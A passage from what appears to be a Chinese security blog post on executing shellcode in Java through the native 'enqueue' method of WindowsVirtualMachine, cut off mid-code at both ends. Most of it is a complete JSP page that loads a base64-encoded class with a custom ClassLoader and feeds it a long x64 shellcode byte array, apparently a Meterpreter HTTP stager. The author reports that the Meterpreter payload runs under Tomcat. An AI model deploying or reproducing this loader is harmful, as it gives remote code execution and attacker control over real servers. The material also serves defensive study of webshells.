ByteArrayOutputStream();<br>            byteArrayOutputStream.write(buf);<br><br><br>            <span class="hljs-comment">//byteArrayOutputStream.write(&quot;calc\0&quot;.getBytes());</span><br>            <span class="hljs-keyword">byte</span>[] result = byteArrayOutputStream.toByteArray();<br><br>            Method method = clazz.getDeclaredMethod(<span class="hljs-string">&quot;run&quot;</span>, <span class="hljs-keyword">byte</span>[].class);<br>            method.invoke(clazz, result);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Class <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.defineClass(bytes, <span class="hljs-number">0</span>, bytes.length);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>base64编码的内容，调用了enqueue函数，这个函数是native方法，会执行传入的shellcode</p><p><a href="https://imgtu.com/i/XYZ3hq"><img src="https://s1.ax1x.com/2022/06/01/XYZ3hq.png" alt="XYZ3hq.png"></a></p><p>enqueue方法写的跟远线程注入的代码一模一样</p><p><a href="https://imgtu.com/i/XYZJ3V"><img src="https://s1.ax1x.com/2022/06/01/XYZJ3V.png" alt="XYZJ3V.png"></a></p><p>jsp文件，测试执行弹计算器的payload会出现问题导致tomcat停止运行，meterpreter的执行正常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>    <br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">public</span> Class <span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.defineClass(bytes, <span class="hljs-number">0</span>, bytes.length);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">base64Encode</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bs)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;Class base64;String value = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">try</span> &#123;base64=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);Object Encoder = base64.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-keyword">null</span>).invoke(base64, <span class="hljs-keyword">null</span>);value = (String)Encoder.getClass().getMethod(<span class="hljs-string">&quot;encodeToString&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; <span class="hljs-keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="hljs-keyword">new</span> Object[] &#123; bs &#125;);&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>);<br>            Object Encoder = base64.newInstance();<br>            value = (String)Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; <span class="hljs-keyword">byte</span>[].class &#125;).invoke(Encoder, <span class="hljs-keyword">new</span> Object[] &#123; bs &#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br><br>        &#125;<br>    &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] base64Decode(String bs) <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class base64;<br>        <span class="hljs-keyword">byte</span>[] value = <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;base64=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            Object decoder = base64.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-keyword">null</span>).invoke(base64, <span class="hljs-keyword">null</span>);<br>            value = (<span class="hljs-keyword">byte</span>[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="hljs-keyword">new</span> Object[] &#123; bs &#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>); Object decoder = base64.newInstance();<br>                value = (<span class="hljs-keyword">byte</span>[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;).invoke(decoder, <span class="hljs-keyword">new</span> Object[] &#123; bs &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>%&gt;<br><br>&lt;%<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        String classStr=<span class="hljs-string">&quot;yv66vgAAADEAMAoABwAhCAAiCgAjACQF//////////8IACUHACYKAAsAJwcAKAoACQApBwAqAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAChMc3VuL3Rvb2xzL2F0dGFjaC9XaW5kb3dzVmlydHVhbE1hY2hpbmU7AQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAApFeGNlcHRpb25zBwArAQALb3BlblByb2Nlc3MBAAQoSSlKAQADcnVuAQAFKFtCKVYBAAR2YXIyAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADYnVmAQACW0IBAApTb3VyY2VGaWxlAQAvV2luZG93c1ZpcnR1YWxNYWNoaW5lLmphdmEgZnJvbSBJbnB1dEZpbGVPYmplY3QMAAwADQEABmF0dGFjaAcALAwALQAuAQAEdGVzdAEAEGphdmEvbGFuZy9PYmplY3QMABMAFAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAC8ADQEAJnN1bi90b29scy9hdHRhY2gvV2luZG93c1ZpcnR1YWxNYWNoaW5lAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtsb2FkTGlicmFyeQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAD3ByaW50U3RhY2tUcmFjZQAhAAsABwAAAAAABAABAAwADQABAA4AAAAzAAEAAQAAAAUqtwABsQAAAAIADwAAAAoAAgAAAAsABAAMABAAAAAMAAEAAAAFABEAEgAAAYgAEwAUAAEAFQAAAAQAAQAWAQgAFwAYAAEAFQAAAAQAAQAWAAkAGQAaAAEADgAAAG0ABgACAAAAHRICuAADFAAEKhIGEgYDvQAHuAAIpwAITCu2AAqxAAEABQAUABcACQACAA8AAAAaAAYAAAATAAUAFgAUABkAFwAXABgAGAAcABsAEAAAABYAAgAYAAQAGwAcAAEAAAAdAB0AHgAAAAEAHwAAAAIAIA==&quot;</span>;<br>        Class clazz = <span class="hljs-keyword">new</span> MyClassLoader().get(base64Decode(classStr));<br><br><br><br>        <span class="hljs-keyword">byte</span> buf[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]<br>                &#123;<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xfc</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe4</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xcc</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x65</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x60</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x72</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xb7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xac</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x61</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x02</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xed</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x42</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3c</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x66</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x81</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x78</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x02</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x85</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x72</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x80</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x85</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x74</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x67</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe3</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x34</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xac</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x38</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf1</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x03</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x24</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x08</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x45</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x39</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd1</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x24</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x66</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x1c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x04</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5e</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xec</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x12</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xdb</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xbe</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x77</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x69</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6e</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x69</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6e</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x65</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x74</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc7</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x77</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x26</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x07</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe1</span>,<br>                        (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x53</span>, (<span class="hljs-keyword">byte</span>) 